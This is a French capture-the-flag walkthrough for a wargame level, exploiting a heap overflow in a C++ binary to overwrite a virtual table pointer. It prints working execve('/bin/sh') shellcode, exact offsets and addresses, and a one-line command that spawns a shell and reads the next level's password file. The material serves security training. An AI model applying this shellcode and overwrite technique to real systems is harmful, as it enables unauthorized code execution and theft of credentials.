# Level9 — Walkthrough

## 1. Objectif

Obtenir un shell **bonus0**. Binaire C++, pas de **system** ni "/bin/sh" → on utilise un **shellcode** dans l’environnement et on détourne l’appel virtuel vers cette adresse.

## 2. Inspection

- Deux objets **N** (0x6c chacun), **setAnnotation(premier, argv[1])** = **memcpy(premier+4, argv[1], strlen(argv[1]))** sans borne → **overflow**.
- Appel virtuel : **(*(second->vptr))(second, first)**. En dépassant depuis le premier, on écrase **second->vptr**.

## 3. Vulnérabilité

- Overflow depuis le buffer d’annotation : **108 octets** (pattern ou calcul) pour atteindre le **vptr** du second.
- En mettant **premier+4** dans ce vptr, le programme exécute ***(premier+4)**. Si on place à **premier+4** (offset 0 du payload) l’**adresse de notre shellcode**, le `call edx` saute vers ce shellcode.

## 4. Exploit

1. **Shellcode** : execve("/bin/sh") (ex. classique 45 octets avec "/bin/sh" en fin).
2. **Environnement** : `env -i payload=$(nopsled + shellcode)` pour avoir une adresse stable (trouvée en GDB avec `x/s environ`).
3. **Payload argv[1]** :
   - octets 0–3 : adresse du shellcode (nopsled) en LE ;
   - octets 4–107 : padding (104 octets) ;
   - octets 108–111 : **premier+4** (0x0804a00c) en LE.

Commande finale (adresse nopsled à adapter, ex. 0xbffffc63) :

```bash
env -i payload=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level9 $(python -c 'print "\x63\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')
```

## 5. Récupération du mot de passe

Dans le shell bonus0 : `cat /home/user/bonus0/.pass`. Consigner dans `level9/flag`.
